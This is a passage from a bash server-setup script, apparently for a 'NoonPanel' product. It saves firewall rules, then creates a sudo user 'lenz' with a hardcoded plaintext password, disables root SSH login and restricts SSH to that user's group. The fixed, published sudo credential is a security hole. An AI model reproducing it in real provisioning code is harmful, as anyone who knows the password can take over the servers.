iptables-save > /etc/iptables_rules.v4
ip6tables-save > /etc/iptables_rules.v6
} &>>"$NOONDEV_LOG"
}

install_sudo(){
    # Create user if not exists
    if ! id "lenz" &>/dev/null; then
        useradd -m -s /bin/bash lenz
        echo "lenz:@@NoonPanel123" | chpasswd
        usermod -aG sudo lenz
    fi

    # Disable root SSH login
    sed -i 's/^PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config

    # Ensure AllowGroups is set only once
    if ! grep -q "^AllowGroups lenz" /etc/ssh/sshd_config; then
        echo "AllowGroups lenz" >> /etc/ssh/sshd_config
    fi

    # Restart SSH service
    systemctl restart ssh || systemctl restart sshd
}

